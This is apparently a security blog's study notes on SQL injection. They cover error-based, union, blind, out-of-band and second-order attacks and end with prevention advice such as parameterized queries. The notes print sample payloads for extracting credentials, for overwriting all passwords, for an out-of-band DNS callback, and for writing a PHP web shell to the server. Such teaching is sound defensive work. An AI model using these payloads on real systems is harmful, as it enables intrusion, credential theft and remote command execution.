---
title: SQL Injection
date: 2022-01-25 12:00:00 -0400
image: 
 path: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli.png
 height: 1100
 width: 500
categories: [Web Security, Portswigger Academy]
tags: [web security, theory, owasp, sqli]
---

A SQL injection is an attack in which the attacker executes arbitrary SQL commands on an application’s database by supplying malicious input inserted into a SQL statement. This happens when the input used in SQL queries is incorrectly filtered or escaped and can lead to authentication bypass, sensitive data leaks, tampering of the database and RCE in some cases.
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli1.jpg)

## In-Band (classic) SQL Injection

- Occurs when the attacker uses the same communication channel to both launch the attack and gather the result of the attack
    - Retrieved data is presented directly in the web page
- Easier to exploit than other categories of SQLi

### Error-Based SQLi

- Error bases SQLi is an in-band SQLi technique that forces the database to generate an error, giving the attacker information upon which to refine their injection

```bash
www.random.com/app.php?id='
#output
#You have an error in your SQL syntax, check the manual that corresponds to your MySQL server version...
```

### Union-Based SQLi

- Is an in-band SQLi technique that leverages the UNION SQL operator to combine the results of two queries into a single result set
- Input:

```sql
# retrieving data from another table
http://www.random.com/app.php?id=’ UNION SELECT username, password FROM users; --

# update all passwords from a table with POST method
http://www.random.com/app.php?new_password="password12345';--"
query = UPDATE Users SET Password='password12345';-- WHERE Id = 2;

--- The WHERE clause, which specifies the criteria of the rows that should be updated, is commented out in this query. The database would update all rows in the table, and change all of the passwords in the Users table to password12345. The attacker can now log in as anyone by using that password
```

## Inferential (Blind) SQL Injection

- SQLi vuln where there is no actual transfer of data via the  webapp
- Just as dangerous as in-band SQLi
    - Attacker be able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server
- Takes longer to exploit than in-ban sql injection

### Boolean-based SQLi

- Uses boolean conditions to return a different result depending on whether the query returns a TRUE or FALSE result.

```sql
www.random.com/app.php?id=1
select title from product where id=1
#Payload 1 (false)
www.random.com/app.php?id=1 and 1=2
select title from product where id=1 and 1=2
#Payload 2 (true)
www.random.com/app.php?id=1 and 1=1
select title from product where id=1 and 1=1 
```

```sql
User table:
Administrator / e3c3889ded99ej29dj9edjdje992
SUBSTRING(a,b,c): function that select a part of a string a: the string, b:the first posicion, c=how many chars
#Payload1
www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username ='Administrator'), 1, 1)='s'
#Query
select title from product where id=1 and SUBSTRING((SELECT Password FROM Users Where Username='Administrator'),1,1)='s'
#result: nothing is returned because is false

#Payload 2
www.random.com/app.php?id=1 and SUBSTRING((SELECT Password FROM Users Where Username='Administrator'),1,1)='e'
#Query
select title from product where id=1 and SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)='e'
#result: Returned true, the tile of product id 1 is returned bc "e" is the first character of the hashed pass
```

### Time-based Blind SQLi

- Relies in the database pausing for a specified amount of time, then returning the result, indicating a success SQL query execution
- Ex: if the first character of the administrator’s hashed pass is an “a”, wait 10 seconds.

## Out-of-band (OAST) SQLi

- Consists of triggering an out-of-band network connection to a system that you control
    - Not common, uses variety os protocols (DNS,HTTP)

```sql
'; exec master..xp_dirtree '//434934839493499.burpcollabolator.net/a'--
```

## Second order SQLi

Second order SQLi happens when applications user input gets stored in the database, then retrieved and used unsafely in a SQL query. 
For example consider an app that register an user by specifying username and password, and the user submit the following request:

```sql
POST /register
Host: example.com

(POST body)
username='jesus' UNION SELECT Username, Password FROM Users;-- '&password=jesus123
```

This query has a payload in the username field, later  the malicious user accesses their email with the following GET request:
```bash
GET /emails
Host: example.com
```
If the user doesn't provide a username the app will retrieve the currently logged-in username and use it populate a SQL query:
```sql
SELECT Title, Body FROM Emails WHERE Username='jesus' UNION SELECT Username, Password FROM Users;--
```
But the attacker username contains the payload, so this will return all usernames and password as email titles and bodies in the HTTP response.

## Exploiting the Database

### Exploiting Error-Based SQLi

- Submit SQL-specific characters such as ' or ", and look for error or other anomalies
- Different characters give you different error
  
### Exploiting Union-Based SQLi
There are two rules for combining the result sets of two queries by using **UNION**
- The number and order of the columns must be the same in all queries
- The data types must be compatible

**Steps**

- Figure out the number of columns that the query is making using **ORDER BY**
```sql
select title, cost from product where id=1 order by 1
```
  - Incrementally inject a series of ORDER BY clauses until you get an error or observe a different behavior in the application
```sql
order by 1--
order by 2--
order by 3-- 
```
  - The ORDER BY position number 3 is out of range, this means the table has only two columns
  - Other method for determining the numbers of columns is using **NULL VALUES**:
```sql
select title, cost from product where id=1 UNION SELECT NULL--
``` 
  - If not error is returned qe have to increase the NULL VALUES
```sql
UNION SELECT NULL--
UNION SELECT NULL, NULL --
```
- Figure the data types of the columns (interested in string data)
  - Probe each column to test whether it can hold string data by submitting a series of UNION SELECT payloads that place a string value into each column in turn
  
```sql
UNION SELECT 'a', NULL--
#Response:Conversion failed when converting the varchar value 'a' to data type int

UNION SELECT 'a', NULL--
UNION SELECT NULL,'a'--
```

- Use the UNION operator to output information from the database

### Exploiting Boolean-Based Blind SQLi
- Submit a Boolean condition that evaluate to True/False and note the response
- Write a program that uses conditional statements to ask the database a series of True/False questions and monitor response
### Exploiting Time-Based Blind SQLi
- Submit a payload that pauses the application for a specified period of time
- Write a program that uses conditional statements to ask the database a series of True/False questions and monitor response
### Exploiting Out-of-Band SQLi
- Submit OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitor for any resulting interactions
- Depending on SQL injection use different methods for exfill data
## Escalating the Attack
### Learn About the Database
First, we need information about the structure of the database, the payloads previously reviewed require some knowledge of the database, such as table names or field names, so we can attempt some trial-error SQL queries to determine the database version, it should look like this:
```sql
SELECT Title, Body FROM Emails WHERE Username='jesus' UNION SELECT 1,@@version;--
```
Once you know the version of database, you can extract the table names with specific commands for each database version, it should look like this:
```sql
SELECT Title, Body FROM Emails WHERE Username='jesus' UNION SELECT 1, table_name FROM information_schema.tables
```
And this one will show you the columns names of the specific table:
```sql
SELECT Title, Body FROM Emails WHERE Username='jesus' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='Users'
```
### Gain a Web Shell
Another way to escalate SQLi is getting a web shell on the server, for example if we are attacking a php website, the following code will take the request parameter named *cmd* and execute it as a system command.
```php
<? system($_REQUEST['cmd']); ?>
```
Also you can upload php code to location in the web server you can access, . For example, you can write the password of a nonexistent user and the PHP code `<? system($_REQUEST['cmd']); ?>` into a file located at */var/www/html/shell.php* on the target server:
```sql
SELECT Password FROM Users WHERE Username='abc'UNION SELECT "<? system($_REQUEST['cmd']); ?>"INTO OUTFILE "/var/www/html/shell.php"
```
Since the password will be blank because not exist, you are uploading the php script in that file, then you can simply access the file and execute any command you wish:
`http://www.example.com/shell.php?cmd=COMMAND`

## How to prevent SQLi vulnerabilites?
- Primary Defenses:
  - **Use of Prepared Statements (Parameterized Queries)**
    - Code Vulnerable to SQLi
    - ![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli2.jpg)
    - The user supplied input *customer name* is embedded directly into the SQL statement 
    - The construction of the SQL statement is performed in two steps:
    - The application specifies the query structure with placeholders for each user input
    - The application specifies the content of each placeholder
    - Code not vulnerable to SQLi
    - ![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/Portswigger/sqli3.jpg)
  - Use of Stores Procedures
    - Is a batch of statements grouped together and stored  in the database
    - Not always safe from SQL Injection, still need to be called in a parameterized way
  - Whitelist Input Validation
    - Defining what values are authorized, everything else is unauthorized
    - Useful for values that cannot be specified as parameter placeholders, such as a table name
  - Escaping All User Supplied Input
    - Only used as last resort
- Optional Defenses:
  - Least Privilege
    - The application should use the lowest possible level of privileges when accessing the database
    - Any unnecessary default functionality in the database should be removed or disabled
    - Ensure CIS benchmark for the database in use is applied
    - All vendor-issued security patches should be applied in a timely fashion
 
## References
- [Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP Top 10 - SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Bug Bounty Bootcamp](https://www.amazon.com/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities-ebook/dp/B08YK368Y3)